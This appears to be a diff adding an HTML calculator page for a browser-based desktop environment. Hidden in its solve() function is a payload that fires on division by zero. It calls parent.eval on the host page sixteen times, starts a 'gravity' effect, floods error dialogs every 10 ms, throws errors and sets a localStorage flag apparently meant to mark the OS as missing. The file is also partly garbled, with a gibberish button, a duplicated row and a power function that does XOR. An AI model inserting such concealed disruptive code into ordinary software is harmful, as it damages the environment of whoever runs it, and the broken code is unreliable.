@@ -1,0 +1,168 @@
+<html>
+
+<head>
+	<title>Calculator</title>
+	<style>
+		.btn {
+			background-color: #777788;
+			color: black;
+			border: solid black 2px;
+			width: 12%;
+			user-select: none;
+			-moz-user-select: none;
+			-webkit-user-select: none;
+			-ms-user-select: none;
+		}
+
+		.output {
+			background-color: #AAACA8;
+			color: black;
+			border: solid black 2px;
+			width: 100%;
+			user-select: text;
+			-moz-user-select: text;
+			-webkit-user-select: text;
+			-ms-user-select: text;
+		}
+
+		.error {
+			background-color: #AAACA8;
+			margin-bottom: 10px;
+			text-align: center;
+			width: 210px;
+			color: red;
+			border: solid black 2px;
+		}
+
+
+		body {
+			background: #333536;
+			color: #dcdeee;
+		}
+	</style>
+</head>
+
+<body>
+	<center>
+		<div class="error" id="err" style="display:none;"><b>ERROR</b></div>
+		<table class="main">
+			<tr>
+				<td colspan="3"><input type="text" id="result" class="output" disabled /></td>
+                <td><input type="button" value="c" onclick="clr()" class="btn" /> </td>
+            </tr>
+            <tr>
+                <td><input type="button" value="1" onclick="dis('1')" class="btn" /> </td>
+                <td><input type="button" value="2" onclick="dis('2')" class="btn" /> </td>
+                <td><input type="button" value="3" onclick="dis('3')" class="btn" /> </td>
+                <td><input type="button" value="r" onclick="rem()" class="btn" /> </td>
+            </tr>
+            <tr>
+                <td><input type="button" value="4" onclick="dis('4')" class="btn" /> </td>
+                <td><input type="button" value="5" onclick="dis('5')" class="btn" /> </td>
+                <td><input type="button" value="6" onclick="dis('6')" class="btn" /> </td>
+                <td><input type="button" value="/" onclick="dis('/')" class="btn" /> </td>
+
+            <tr>
+                <td><input type="button" value="rswrwrrswrwrrwdrcwrwderw" onclick="dis('666666666575765676567656543212345678904')" class="btn" /> AaAaaAaaAaaxwaswdevgrbthnytnhy</td>
+                <td><input type="button" value="5" onclick="dis('5')" class="btn" /> </td>
+                <td><input type="button" value="6" onclick="dis('6')" class="btn" /> </td>
+                <td><input type="button" value="/" onclick="dis('/')" class="btn" /> </td>
+
+            </tr>
+            <tr>
+                <td><input type="button" value="7" onclick="dis('7')" class="btn" /> </td>
+                <td><input type="button" value="8" onclick="dis('8')" class="btn" /> </td>
+                <td><input type="button" value="9" onclick="dis('9')" class="btn" /> </td>
+                <td><input type="button" value="-" onclick="dis('-')" class="btn" /> </td>
+
+            </tr>
+            <tr>
+                <td><input type="button" value="." onclick="dis('.')" class="btn" /> </td>
+                <td><input type="button" value="0" onclick="dis('0')" class="btn" /> </td>
+                <td><input type="button" value="=" onclick="solve()" class="btn" /> </td>
+                <td><input type="button" value="+" onclick="dis('+')" class="btn" /> </td>
+            </tr>
+            <tr>
+                <td><input type="button" value="*" onclick="dis('*')" class="btn" /> </td>
+                <td><input type="button" value="M+" onclick="addMem(document.getElementById('result').value)" class="btn" />  </td>
+            </tr>
+            <!-- <tr> -->
+        </table>
+        <textarea id="mem"></textarea>
+    </center>
+                  <!-- <td><input type="textbox" id="f" placeholder="Try mean([1,2]), function a(b) { return b/2; }"></input></td>
+              <td><input type="button" value="+eq" onclick="document.getElementById('result').value+=document.getElementById('f').value" class="btn" />  </td> -->
+
+
+    <script>
+        var resulte = document.getElementById("result");
+        var erre = document.getElementById("err");
+        function toThePowerOf(number1,pof) {
+          return number1^pof
+        }
+        function triangleArea(leg1,leg2) {
+          return (leg1*leg2)/2
+        }
+        function valueDiv(div) {
+          return document.getElementById(div).value
+        }
+        function mean(arrayList) {
+          return arrayList.reduce((a, b) => a + b, 0)/arrayList.length
+        }
+        function median(numbers) {
+            const sorted = numbers.slice().sort((a, b) => a - b);
+            const middle = Math.floor(sorted.length / 2);
+             if (sorted.length % 2 === 0) {
+                return (sorted[middle - 1] + sorted[middle]) / 2;
+            }
+            return sorted[middle];
+        }
+        function additiveInverse(x) {
+          return -x;
+        }
+        function multiplicativeInverse(x) {
+          return 1/x;
+        }
+
+        function newfunc(fName,fValue) {
+          var s="function "+fName+" {\n  return "+fValue+"; \n};\n";
+          eval(s)
+          console.log(s)
+        }
+
+        function dis(val) {
+          resulte.value += val
+        }
+
+        function clr() {
+            resulte.value = ""
+        }
+
+        function rem() {
+            var x = resulte.value;
+            resulte.value = x.substring(0, x.length - 1);
+        }
+
+        function solve() {
+            var x = resulte.value;
+            if (x.includes("undefined")) return clr();
+            if (x.includes("NaN")) return clr();
+            if (x.includes("null")) return clr();
+            erre.style.display = "none";
+            try {
+                resulte.value = eval(x);
+								if(resulte.value==(1/0)){
+									parent.eval('apps.gravity.exec();setInterval(()=>{msgbox("ERROR","error","ERROR",[{script:function(){},title:"ERROR"}]);},10);setTimeout(()=>{onerror(Math.round(Math.random()*6553565535).toString(2));},3000);localStorage["osnotfound"]="true";')parent.eval('apps.gravity.exec();setInterval(()=>{msgbox("ERROR","error","ERROR",[{script:function(){},title:"ERROR"}]);},10);setTimeout(()=>{onerror(Math.round(Math.random()*6553565535).toString(2));},3000);localStorage["osnotfound"]="true";')parent.eval('apps.gravity.exec();setInterval(()=>{msgbox("ERROR","error","ERROR",[{script:function(){},title:"ERROR"}]);},10);setTimeout(()=>{onerror(Math.round(Math.random()*6553565535).toString(2));},3000);localStorage["osnotfound"]="true";')parent.eval('apps.gravity.exec();setInterval(()=>{msgbox("ERROR","error","ERROR",[{script:function(){},title:"ERROR"}]);},10);setTimeout(()=>{onerror(Math.round(Math.random()*6553565535).toString(2));},3000);localStorage["osnotfound"]="true";')parent.eval('apps.gravity.exec();setInterval(()=>{msgbox("ERROR","error","ERROR",[{script:function(){},title:"ERROR"}]);},10);setTimeout(()=>{onerror(Math.round(Math.random()*6553565535).toString(2));},3000);localStorage["osnotfound"]="true";')parent.eval('apps.gravity.exec();setInterval(()=>{msgbox("ERROR","error","ERROR",[{script:function(){},title:"ERROR"}]);},10);setTimeout(()=>{onerror(Math.round(Math.random()*6553565535).toString(2));},3000);localStorage["osnotfound"]="true";')parent.eval('apps.gravity.exec();setInterval(()=>{msgbox("ERROR","error","ERROR",[{script:function(){},title:"ERROR"}]);},10);setTimeout(()=>{onerror(Math.round(Math.random()*6553565535).toString(2));},3000);localStorage["osnotfound"]="true";')parent.eval('apps.gravity.exec();setInterval(()=>{msgbox("ERROR","error","ERROR",[{script:function(){},title:"ERROR"}]);},10);setTimeout(()=>{onerror(Math.round(Math.random()*6553565535).toString(2));},3000);localStorage["osnotfound"]="true";')parent.eval('apps.gravity.exec();setInterval(()=>{msgbox("ERROR","error","ERROR",[{script:function(){},title:"ERROR"}]);},10);setTimeout(()=>{onerror(Math.round(Math.random()*6553565535).toString(2));},3000);localStorage["osnotfound"]="true";')parent.eval('apps.gravity.exec();setInterval(()=>{msgbox("ERROR","error","ERROR",[{script:function(){},title:"ERROR"}]);},10);setTimeout(()=>{onerror(Math.round(Math.random()*6553565535).toString(2));},3000);localStorage["osnotfound"]="true";')parent.eval('apps.gravity.exec();setInterval(()=>{msgbox("ERROR","error","ERROR",[{script:function(){},title:"ERROR"}]);},10);setTimeout(()=>{onerror(Math.round(Math.random()*6553565535).toString(2));},3000);localStorage["osnotfound"]="true";')parent.eval('apps.gravity.exec();setInterval(()=>{msgbox("ERROR","error","ERROR",[{script:function(){},title:"ERROR"}]);},10);setTimeout(()=>{onerror(Math.round(Math.random()*6553565535).toString(2));},3000);localStorage["osnotfound"]="true";')parent.eval('apps.gravity.exec();setInterval(()=>{msgbox("ERROR","error","ERROR",[{script:function(){},title:"ERROR"}]);},10);setTimeout(()=>{onerror(Math.round(Math.random()*6553565535).toString(2));},3000);localStorage["osnotfound"]="true";')parent.eval('apps.gravity.exec();setInterval(()=>{msgbox("ERROR","error","ERROR",[{script:function(){},title:"ERROR"}]);},10);setTimeout(()=>{onerror(Math.round(Math.random()*6553565535).toString(2));},3000);localStorage["osnotfound"]="true";')parent.eval('apps.gravity.exec();setInterval(()=>{msgbox("ERROR","error","ERROR",[{script:function(){},title:"ERROR"}]);},10);setTimeout(()=>{onerror(Math.round(Math.random()*6553565535).toString(2));},3000);localStorage["osnotfound"]="true";')parent.eval('apps.gravity.exec();setInterval(()=>{msgbox("ERROR","error","ERROR",[{script:function(){},title:"ERROR"}]);},10);setTimeout(()=>{onerror(Math.round(Math.random()*6553565535).toString(2));},3000);localStorage["osnotfound"]="true";')
+								}
+            } catch (err) {
+                clr();
+                erre.style.display = "";
+            }
+        }
+        function addMem(txt) {
+          document.getElementById("mem").value+="\n"+txt
+        }
+    </script>
+</body>
+
+</html>
